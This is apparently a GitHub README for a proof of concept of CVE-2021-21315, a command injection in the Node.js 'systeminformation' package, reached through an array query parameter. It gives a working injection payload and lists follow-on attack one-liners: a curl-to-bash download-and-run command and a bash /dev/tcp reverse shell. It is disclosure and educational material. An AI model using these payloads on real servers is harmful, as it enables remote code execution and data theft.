# CVE-2021-21315-systeminformation
This is Proof of Concept for [CVE-2021-21315](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21315) which affects The System Information Library for Node.JS (npm package "systeminformation"). [npmjs.com/systeminformation](https://www.npmjs.com/package/systeminformation)

"be sure to check or sanitize service parameters that are passed to si.inetLatency(), si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings, reject any arrays. String sanitation works as expected. "

Because it's not well explained vulnerability (in my opinion), i decided to code small app basing on vulnerable version of systeminformation.
The PoC contains:
1) Test app made in Node.js, using express and vulnerable systeminformation
2) Simple testing payload to create .txt file on affected machine

Steps to reproduce:
1) Run application on Linux server environment
2) Make GET request to site.com/api/getServices?name=nginx (nginx is just example)
![obraz](https://user-images.githubusercontent.com/72838191/109575455-223c8d00-7af2-11eb-92fa-f242d0e74947.png)
3) Now try to send request like this: yoursite.com/api/getServices?name=$(echo -e 'Sekurak' > pwn.txt)
![obraz](https://user-images.githubusercontent.com/72838191/109575807-d3dbbe00-7af2-11eb-8c83-5129e5cdb762.png)

This will fail, because of string sanitization:
![obraz](https://user-images.githubusercontent.com/72838191/109575891-fcfc4e80-7af2-11eb-9b9d-86a5cae803f6.png)

As said in CVE details "sanitization works as expected, reject any arrays [...]"

4) Now try to send request: yoursite.com/api/getServices?name[]=$(echo -e 'Sekurak' > pwn.txt)
![obraz](https://user-images.githubusercontent.com/72838191/109576285-cbd04e00-7af3-11eb-8ac3-2432e23721e6.png)
This time, if you take a look at "name" value, it was not sanitized - success ! Let's see if command was executed

![obraz](https://user-images.githubusercontent.com/72838191/109576497-21a4f600-7af4-11eb-85a1-3610c25edbee.png)

Success! Our command got executed. 
Of course no one cares about "pwn.txt", but potential attacker can:
1) Upload internal files, like index.js (core of our application, with potential api keys, database connection string and others) or other
2) Download and execute scripts - curl -s http://server/path/script.sh | bash /dev/stdin arg1 arg2
3) Reverse shell - bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
4) Kill processes (you can kill our test node application aswell)
5) Even more evil things....

"Command injection" sounds innocent, but it may have huge impact if certain conditions are meet

Problem was fixed in version 5.3.1 of "systeminformation"
Credits to https://www.huntr.dev/users/EffectRenan (He found vulnerability, however in my opinion, his "Poc" did not show real world impact)

Also, do not heist to use this PoC in some CTF's but would be cool if you will credit author of finding - EffectRean and poc creator - me, cheers!

# Disclaimer
This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
